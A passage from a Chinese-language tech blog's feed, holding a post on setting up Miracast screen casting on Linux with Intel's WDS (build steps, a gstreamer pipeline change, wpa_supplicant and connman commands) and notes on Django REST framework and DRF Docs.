&lt;li&gt;寫文章的時候附上參考連結的時候常常不想要只附上網址，而是連網頁標題也一起附上，覺得要自己手動複製很麻煩，所以就寫了個小程式來做這件事。  &lt;/li&gt;
&lt;li&gt;使用 Selenium，所以支援使用 JavaScript 的網頁（例如：Dcard），不過也因為這樣所以速度有點慢，但目前是沒有什麼不能等的狀況，所以算是夠用。  &lt;/li&gt;
&lt;li&gt;基本上已經是我寫文章的時候必定會使用到的工具了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/M157q_News_RSS"&gt;M157q_News_RSS&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個每小時發科技新聞 tweet 的機器人，主要來源是我有追蹤的科技新聞網站的 RSS feed。  &lt;/li&gt;
&lt;li&gt;之前是把科技新聞類的 RSS 放在 Feedly 裏面，但會造成未讀量暴增，常常幾天沒消未讀就會衝到 999+，後來覺得這樣不是辦法，而且很多其實不一定要看。  &lt;/li&gt;
&lt;li&gt;所以就想說能不能用個會發科技新聞的 Twitter bot，有看到的話就看，沒看到的話就算了。  &lt;/li&gt;
&lt;li&gt;是 fork 別人的程式碼來改的：&lt;a href="https://github.com/M157q/py-feedr"&gt;GitHub - M157q/py-feedr: A Python parser to tweet the latest updates from multiple RSS feeds.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;後來自己加上了訂閱事件的功能，當初是針對 Golang Taiwan Gathering 報名要搶票這件事，所以用來針對某些 KKTIX 的網頁新增事件時，會用 Twitter 的私訊通知我，讓我不會錯過報名的時間，甚至可以第一時間報名。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/hungys-blog/my-software-stack-2a406c1c57c1"&gt;My Software Stack – Hungys.blog() – Medium&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Tools"></category><category term="M157q"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>如何在 Linux 上使用 Miracast</title><link href="https://blog.m157q.tw/posts/2018/01/08/miracast-on-linux/" rel="alternate"></link><published>2018-01-15T15:49:47+08:00</published><updated>2018-01-15T15:49:47+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-08:posts/2018/01/08/miracast-on-linux/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;先說結論，試了以下兩個專案：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/albfan/miraclecast"&gt;GitHub - albfan/miraclecast: Connect external monitors to your system via Wifi-Display specification also known as Miracast&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/derekdai/miraclecast"&gt;GitHub - derekdai/miraclecast: Connect external monitors to your system via Wifi-Display specification also known as Miracast&lt;/a&gt; 這個 fork 出去修改的版本解決了比較多的問題，但最後嘗試了一番還是沒辦法順利使用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/intel/wds"&gt;GitHub - intel/wds: Wireless Display Software For Linux OS (WDS)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;嗯，沒錯，是那個 Intel。  &lt;/li&gt;
&lt;li&gt;這個算是試到後來可以動的，但結果不盡理想，畫面非常卡，聲音也沒有出來，猜測是還得去調整其他 &lt;code&gt;gstreamer&lt;/code&gt; 的參數，這篇會以紀錄 &lt;code&gt;wds&lt;/code&gt; 為主。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;2017 年 5 月換租屋處後，客廳有台螢幕，雖然不大，但至少比筆電的螢幕還大。想說有時候筆電或手機可以把畫面投到上面用大螢幕看比較爽，然後又懶的接有線的 VGA 或 HDMI，就想說來買個無線投影裝置。  &lt;/p&gt;
&lt;p&gt;於是就在 6 月初左右就上網買了便宜的無線投影裝置，該裝置對於 iOS 裝置的支援是使用 &lt;a href="https://en.wikipedia.org/wiki/Digital_Living_Network_Alliance"&gt;DLNA&lt;/a&gt;，對於 Android 裝置的支援則是使用 &lt;a href="https://en.wikipedia.org/wiki/Miracast"&gt;Miracast&lt;/a&gt;，當時是我第一次知道 Miracast。  &lt;/p&gt;
&lt;p&gt;想說筆電是跑 Arch Linux，和 Android 一樣都是 based on Linux，所以應該也可以使用 Miracast 吧？才發現可以用的東西少的可憐，也不一定會動。在 GitHub 上找到了 2 看起來比較有希望的專案，花了好幾個小時，看程式碼、查閱相關文件，終於成功把筆電的畫面透過 Miracast 無線投影到螢幕上。  &lt;/p&gt;
&lt;p&gt;後來因為室友買了個攜帶型投影機送了 Chromecast 之後就沒有使用 Miracast 了，所以這篇算是個半殘文，但還是想紀錄一下，畢竟花了不少時間研究。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;關於 Miracast&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;可以把它想像成用 Wi-Fi 來傳輸 HDMI 訊號，所以可以不用接線就能把畫面投影到其他有支援 Miracast 的裝置上。  &lt;/li&gt;
&lt;li&gt;除了不用接線外，也不需要有其他的裝置或是要連接到某個 Wi-Fi Access Point。  &lt;ul&gt;
&lt;li&gt;這點真的很方便啊，不用買其他裝置就能支援無線投影。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2012 底，由 Wi-Fi Alliance 推出，也是 Android 4.2 的重要新功能之一，但在 2015 年推出的 Android 6.0 卻消失了。  &lt;/li&gt;
&lt;li&gt;Miracast 不知道為啥一直沒有成為標準。  &lt;/li&gt;
&lt;li&gt;Google 後來推出了 Chromecast，基本上這裝置的功能完全和 Miracast 衝突，而且我覺得沒有比較好，除了得額外多接一個 Chromecast 以外，Chromecast 還需要一個額外的 Wi-Fi Access Point，更別說 Chromecast 實際使用上的體驗真的是頗差的。  &lt;/li&gt;
&lt;li&gt;關於 Miracast 詳細介紹，可以參考這篇繁體中文的文章：&lt;a href="http://www.2cm.com.tw/technologyshow_content.asp?sn=1304260008"&gt;以鏡射與Wi-Fi技術為基礎　Miracast實現多螢影音串流 - 技術前瞻 - 新通訊元件雜誌&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄&lt;/h2&gt;
&lt;p&gt;因為 &lt;a href="https://github.com/derekdai/miraclecast"&gt;MiracleCast&lt;/a&gt; 沒試成功，所以只會以紀錄 &lt;a href="https://github.com/intel/wds"&gt;WDS&lt;/a&gt; 為主。&lt;br /&gt;
其實還有找到一個 &lt;a href="https://cgit.freedesktop.org/~dvdhrm/openwfd/"&gt;openwfd&lt;/a&gt;，不過因為看起來已經年久失修了，所以就沒去試了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;WDS 的裝置分類&lt;/h3&gt;
&lt;p&gt;首先，WDS 把使用 Miracast 的裝置區分為以下兩種：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sink: 要呈現畫面的裝置。  &lt;/li&gt;
&lt;li&gt;Source: 要把畫面投影出去的裝置。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;我使用 WDS 時遇到的問題&lt;/h3&gt;
&lt;p&gt;然後把當時遇到的問題相關連結都先列出來一下：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://lists.01.org/pipermail/wysiwidi-dev/2015-April/000012.html"&gt;[wysiwidi-dev] desktop_source and mirroring display&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/intel/wds/issues/147"&gt;Working with Linux as Source and Miracast Dongle · Issue #147 · intel/wds · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/intel/wds/issues/87"&gt;source video params should be tweaked for desktop mirroring use case · Issue #87 · intel/wds · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/intel/wds/issues/133"&gt;Black/frozen screen · Issue #133 · intel/wds · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;WDS 安裝與使用步驟&lt;/h3&gt;
&lt;p&gt;WDS 會用到以下幾個程式，必須預先安裝：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;wpa_supplicant&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;2.4 以後的版本，且必須要在 build 的時候開啟 &lt;code&gt;CONFIG_P2P=y&lt;/code&gt;, &lt;code&gt;CONFIG_WIFI_DISPLAY=y&lt;/code&gt;, &lt;code&gt;CONFIG_CTRL_IFACE_DBUS_NEW=y&lt;/code&gt; 這 3 個參數  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;connman&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;必須是 1.28 以後的版本  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gstreamer&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下來就可以照著以下步驟來嘗試：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;git clone https://github.com/intel/wds.git&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;cd wds&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;修改程式碼  &lt;ul&gt;
&lt;li&gt;根據 &lt;a href="https://github.com/intel/wds/issues/87"&gt;source video params should be tweaked for desktop mirroring use case · Issue #87 · intel/wds · GitHub&lt;/a&gt; 和 &lt;a href="https://github.com/intel/wds/issues/133"&gt;Black/frozen screen · Issue #133 · intel/wds · GitHub&lt;/a&gt; 這兩個 issues 裡頭提到的解法，我們得修改程式碼裡頭用到 &lt;code&gt;gstreamer&lt;/code&gt; 的參數，不然只會出現黑的畫面，這部份可能因人而異，我只就我遇到的部份描述，附上 git diff，這個參數還有調整的空間就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;diff --git a/mirac_network/mirac-gst-test-source.cpp b/mirac_network/mirac-gst-test-source.cpp  &lt;/span&gt;
&lt;span class="gh"&gt;index 12c2623..821e38a 100644  &lt;/span&gt;
&lt;span class="gd"&gt;--- a/mirac_network/mirac-gst-test-source.cpp  &lt;/span&gt;
&lt;span class="gi"&gt;+++ b/mirac_network/mirac-gst-test-source.cpp  &lt;/span&gt;
&lt;span class="gu"&gt;@@ -42,7 +42,9 @@ MiracGstTestSource::MiracGstTestSource (wfd_test_stream_t wfd_stream_type, std::  &lt;/span&gt;
     } else if (wfd_stream_type == WFD_TEST_VIDEO) {  
         gst_pipeline = &amp;quot;videotestsrc ! videoconvert ! video/x-raw,format=I420 ! x264enc ! mpegtsmux ! rtpmp2tpay ! udpsink name=sink &amp;quot; + hostname_port;  
     } else if (wfd_stream_type == WFD_DESKTOP) {  
&lt;span class="gd"&gt;-        gst_pipeline = &amp;quot;ximagesrc ! videoconvert ! video/x-raw,format=I420 ! x264enc tune=zerolatency ! mpegtsmux ! rtpmp2tpay ! udpsink name=sink &amp;quot; + hostname_port;  &lt;/span&gt;
&lt;span class="gi"&gt;+        gst_pipeline = &amp;quot;ximagesrc use-damage=0 ! videoscale ! videoconvert ! video/x-raw,format=I420,width=1440,height=900,framerate=50/1 ! x264enc aud=false bitrate=2048 dct8x8=true vbv-buf-capacity=1000 tune=stillimage+zerolatency byte-stream=true ! video/x-h264,profile=high ! muxer. pulsesrc device=alsa_output.pci-0000_00_1b.0.analog-stereo.monitor ! audioconvert ! audio/x-raw,channels=2,rate=44100 ! faac ! audio/mpeg,mpegversion=4 ! muxer. mpegtsmux name=muxer alignment=0 ! rtpmp2tpay pt=33 ! udpsink name=sink sync=false &amp;quot; + hostname_port;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cmake .&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;make&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo wpa_supplicant -i wlp0s20u1 -ddt -u&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;wlp0s20u1&lt;/code&gt; 請換成你的無線網卡裝置名稱  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-ddt&lt;/code&gt;: 用來開啟比較詳細的 debug 訊息，且在訊息加上 timestamp  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; : 用來開啟 DBus control interface  &lt;ul&gt;
&lt;li&gt;如果 &lt;code&gt;wpa_supplicant&lt;/code&gt; 在編譯的時候沒有加入上面提到的 &lt;code&gt;CONFIG_CTRL_IFACE_DBUS_NEW=y&lt;/code&gt; 的話，這個選項就不會有用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;執行這行指令的時候最好是先把原本有在用的 network manager 關掉，避免衝突。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo connmand -r -n -d -i wlp0s20u1&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;wlp0s20u1&lt;/code&gt; 請換成你的無線網卡裝置名稱  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-r&lt;/code&gt;: 不要開啟 DNS proxy  &lt;ul&gt;
&lt;li&gt;官方的 README 上沒有加這個選項，是我自己加上去的，我記得當時可以解掉一些問題，但現在忘了是什麼問題了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-n&lt;/code&gt;: 不要在背景執行，方便看到 debug 訊息  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-d&lt;/code&gt;: 開啟 debug 模式  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo connmanctl&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;開啟 connman 的互動式介面  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; enable wifi&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; enable p2p&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; scan p2p&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; peers&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;檢查 p2p 功能是否正常  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; agent on&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果以上都正常的話，應該就會像&lt;a href="https://github.com/intel/wds/wiki"&gt;官方在其 GitHub repo 的 wiki 所列出的截圖&lt;/a&gt;一樣：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Android 手機要無線投影到電腦 (Sink mode)  &lt;ul&gt;
&lt;li&gt;打開 Miracast 選單應該就可以看到電腦裝置  &lt;/li&gt;
&lt;li&gt;選擇投影到電腦上  &lt;/li&gt;
&lt;li&gt;許可連線  &lt;/li&gt;
&lt;li&gt;沒問題的話應該就可以在電腦上跳出一個視窗顯示手機的畫面了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;電腦要無線投影到其他裝置 (Source mode)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; scan&lt;/code&gt; 可以重新掃描附近的裝置  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; peers&lt;/code&gt; 列出可以連線的裝置  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; connect N&lt;/code&gt; 連線到該裝置  &lt;/li&gt;
&lt;li&gt;許可連線  &lt;/li&gt;
&lt;li&gt;正常的話其他裝置應該就會顯示電腦上的畫面了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;還沒到完全能動，畫面有點卡，而且沒有聲音，猜測是還得去調整 &lt;code&gt;gstreamer&lt;/code&gt; 的參數。  &lt;/p&gt;
&lt;p&gt;但就紀錄下來，也給可能有遇到這個問題想要解決的人參考，如果有幫助到你的話很歡迎留言跟我說一下，如果試出了更好的結果當然更棒就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Digital_Living_Network_Alliance"&gt;Digital Living Network Alliance - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Miracast"&gt;Miracast - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.computerworld.com/article/3239864/android/android-nostalgia-old-features.html"&gt;Android nostalgia: 13 once-trumpeted features that quietly faded away | Computerworld&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.2cm.com.tw/technologyshow_content.asp?sn=1304260008"&gt;以鏡射與Wi-Fi技術為基礎　Miracast實現多螢影音串流 - 技術前瞻 - 新通訊元件雜誌&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Miracast"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>關於 Django REST framework 的一些筆記</title><link href="https://blog.m157q.tw/posts/2018/01/07/django-rest-framework-note/" rel="alternate"></link><published>2018-01-16T15:04:00+08:00</published><updated>2018-01-16T15:04:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-07:posts/2018/01/07/django-rest-framework-note/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;2016 年 9 月的時候被老闆告知公司報名了交通大學的梅竹黑客松，要我回母校當評審，然後在一個月內生出一個 API 且附帶文件的網站給參賽者使用。  &lt;/p&gt;
&lt;p&gt;當時公司並沒有這些資料的 API，只有資料而已，所以等於是從零開始設計，想說藉由這次機會，除了提供給參賽者 API 以外，未來也可以提供給公司自己使用。  &lt;/p&gt;
&lt;p&gt;在這之前就有聽過 &lt;a href="https://github.com/encode/django-rest-framework"&gt;Django REST frmaework&lt;/a&gt;，也看過滿多人用的，查了一下發現也有 &lt;a href="https://github.com/manosim/django-rest-framework-docs"&gt;DRF Docs (django-rest-framework-docs)&lt;/a&gt; 這個 plugin 可以用來生出 API 的文件，看了一下範例感覺還不錯，於是就放棄用 Flask 自己刻，直接採用 Django + Django REST framework + DRF Docs + Google Cloud SDK + Google App Engine Flexible Environment，建立一個可以從 BigQuery dataset 撈資料出來且帶有文件說明的 API。  &lt;/p&gt;
&lt;p&gt;以下會就當時使用 Django REST framework 和 DRF Docs 遇到的問題做些紀錄，當時為了馬上解決一些問題，也 fork 了 DRF Docs 的 repo 來改。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Django REST framework&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;以下為了撰寫方便，直接把 Django REST framework 簡稱為　DRF。&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;整個 DRF 我覺得設計得滿完整，甚至也有 plugin 的生態系，如果找不到合適的，也可以自己撰寫 DRF 的 plugin。剛開始上手的話有份官方的 Tutorial 可看：&lt;a href="http://www.django-rest-framework.org/tutorial/quickstart/"&gt;Quickstart - Django REST framework&lt;/a&gt;，建議把整份 tutorial 都唸完會比較瞭解整個 framework 元件之間的關係，畢竟篇幅也不多，加上 Quickstart 也就 8 個頁面而已。剩下的等實際撰寫程式碼時遇到不太懂的時候，再去查詢官網上詳細一點的文件就行了，有時候真的文件說的不夠清楚的話可能還是得去看一下程式碼。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;這邊紀錄一下幾個我自己在閱讀文件的時候花比較多時間理解的部份：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.django-rest-framework.org/tutorial/1-serialization/"&gt;1 - Serialization - Django REST framework&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基本上就是在 Django 的 Model 上再多做一層包裝，可以對 API 做一些客製化設定，比如要顯示哪些欄位、限定哪些權限...等等。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.django-rest-framework.org/api-guide/filtering/"&gt;Filtering - Django REST framework&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;如果要針對不同的使用者得到不同的結果的話，就會需要用到 filtering 的部份。  &lt;/li&gt;
&lt;li&gt;可以針對使用者、網址、可使用參數做限制。  &lt;/li&gt;
&lt;li&gt;有多種不同的 filter 可以用，搜尋、排序、權限，也可以自己繼承下來撰寫客製化的 filter。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.django-rest-framework.org/api-guide/routers/"&gt;Routers - Django REST framework&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基本上跟 Django 的 dispatcher 寫法差不多，但多了一些可以針對 HTTP method 的設定ˇ等等。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/viewsets.py"&gt;django-rest-framework/viewsets.py at master · encode/django-rest-framework · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;當時是因為對 &lt;code&gt;ViewSet&lt;/code&gt; 可以使用的參數不太清楚，看文件又看不出個所以然，所以就跑去看程式碼了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;花了一點時間熟悉之後，我在後續使用上遇到最大的問題是在效能，因為我要去查詢的資料總量滿大的，所以查詢常常都會等很久。還有 DRF 預設的 pagination 部份也沒有處理得很好，查了一下發現也有很多人遇到，所以有滿多文章在講這件事的，這裡列出我自己覺得比較有用的：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://engineering.betterworks.com/2015/09/04/ditching-django-rest-framework-serializers-for-serpy/"&gt;Ditching Django REST Framework Serializers for Serpy · BetterWorks Engineering Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇是作者因為 DRF 的 Serializer 實在是太慢，所以自己寫了另外一個作 serialization 的 library: &lt;a href="https://github.com/clarkduvall/serpy"&gt;serpy&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ses4j.github.io/2015/11/23/optimizing-slow-django-rest-framework-performance/"&gt;Optimizing slow Django REST Framework performance&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇是在講怎麼透過調整 DRF 的 Serializer 來處理 query 時過慢的問題。  &lt;/li&gt;
&lt;li&gt;要用上 &lt;code&gt;queryset.prefech_realted&lt;/code&gt; 等等。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.dabapps.com/blog/api-performance-profiling-django-rest-framework/"&gt;Web API performance: profiling Django REST framework&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇是作者使用了 DRF 並測試其效能以後自己歸納出的一些結論，基本上是推薦使用 DRF，算是我看過最完整對 DRF 做效能測試的文章了。  &lt;/li&gt;
&lt;li&gt;一些迷思：  &lt;ul&gt;
&lt;li&gt;自己寫個框架：即便只有用到 DRF 的 &lt;code&gt;APIView&lt;/code&gt; 其他都沒用到，還是推薦使用 DRF，比起你自己用 Django 撰寫的 API 還是好上許多。  &lt;/li&gt;
&lt;li&gt;想用輕量化的框架：DRF 雖然包含了很多功能，但核心的 view 部份是很簡單的。  &lt;/li&gt;
&lt;li&gt;DRF 會被 Django 的 model 綁住：view 和 serializer 都是可選的，沒有強制綁定。  &lt;/li&gt;
&lt;li&gt;Django/Python/DRF 太慢：這篇文章會大量討論效能的部份，基本上都可以透過適當的資料庫查詢結果暫存、設計良好的 HTTP 暫存以及 shared server-side cache 來解決。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;接下來就是非常詳細的 profiling 步驟與紀錄  &lt;/li&gt;
&lt;li&gt;結論  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Get your ORM lookups right.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Your database lookups will be the bottleneck.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Work on performance improvements selectively.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;You don't always need to use serializers.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但這幾篇文章其實都有點舊了，大部份都是 2015 年的，所以可能不一定符合現在的狀況，不確定 DRF 在效能方面改進了多少就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;另外，DRF 也有設計一些可以拿來做測試的函式，列在官方的這篇文章裡頭：&lt;a href="http://www.django-rest-framework.org/api-guide/testing/"&gt;Testing - Django REST framework&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;DRF Docs&lt;/h2&gt;
&lt;p&gt;DRF Docs 主要功能就是可以根據你在 Django REST framework 所使用的 View function 直接生出 API 文件，有要額外補充的也可以寫在 View function 的 docstring 裡頭，DRF Docs 會幫你呈現出來，這樣就不需要為了 API 額外撰寫文件，只要 docstring 寫得夠清楚就行，可以節省開發上的時間，也可以讓程式碼更容易被理解。  &lt;/p&gt;
&lt;p&gt;當時會 fork &lt;a href="https://github.com/manosim/django-rest-framework-docs"&gt;GitHub - manosim/django-rest-framework-docs: Document Web APIs made with Django Rest Framework&lt;/a&gt; 出來改的主要原因是要改首頁的標題。  &lt;/p&gt;
&lt;p&gt;但實際使用過發現有個需求，就是我想在 docstring 直接寫 markdown，覺得應該也有人有這樣的需求，所以找了一下。發現有個 PR 就是在做這件事，不過還沒被 merge：&lt;a href="https://github.com/manosim/django-rest-framework-docs/pull/117"&gt;Added markdown support for endpoint docstrings by mikeengland · Pull Request #117 · manosim/django-rest-framework-docs · GitHub&lt;/a&gt;，於是就把這個 PR merge 進來使用，基本上沒啥太大的問題。  &lt;/p&gt;
&lt;p&gt;撰寫這篇文章的時候去追了一下進度，發現已經有另外一個支援 markdown 的 PR 被 merge 了：&lt;a href="https://github.com/manosim/django-rest-framework-docs/pull/127"&gt;Add optional markdown for docstrings by rainyday · Pull Request #127 · manosim/django-rest-framework-docs · GitHub&lt;/a&gt;，所以現在的 DRF Docs 應該是有正式支援在 docstring 可以寫 markdown 這件事，但這個部份我自己沒使用過就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;如果熟 Django 的人真的可以很快用 DRF + DRF Docs 弄出一個可以做帳號權限管理的 REST API 網站，而且因為用上了 DRF Docs，所以不會出現程式碼和文件不一致的狀況。當時撰寫完整個網站我也不過花了 &lt;code&gt;53 commits  1,806 ++  761 --&lt;/code&gt;，為期大概一個月，學到了沒碰過的新東西，成功嘗試了 Google App Engine Flexible Environment，期間當然也有做其他事。  &lt;/p&gt;
&lt;p&gt;但如果不考慮快速完成而是考慮效能的話，我大概就不太推薦 DRF，雖然不確定目前效能改善到什麼地步，如果還是要使用的話可能就要在 Database 或架構方面多下點功夫。  &lt;/p&gt;
&lt;p&gt;因為開發完這網站之後我就沒再碰 DRF 了，所以這篇文章可能會顯得有點過時些，但可以當個參考，畢竟這篇主要目的是紀錄給我自己知道到底我把時間花在哪裡了。  &lt;/p&gt;
&lt;p&gt;技術文這種東西真的不太能囤積在草稿啊，能發就要趕快發，不然真的很容易過時。如果是一些跟人比較有關係的文章則大概很難過時，看看技術的長青書基本上都是在講人的態度或是做事的方法與原則。其實也在思考以後寫的一些技術文能否能朝這個方向去多紀錄一些。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/encode/django-rest-framework"&gt;GitHub - encode/django-rest-framework: Web APIs for Django.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/manosim/django-rest-framework-docs"&gt;GitHub - manosim/django-rest-framework-docs: Document Web APIs made with Django Rest Framework&lt;/a&gt;  &lt;/li&gt;
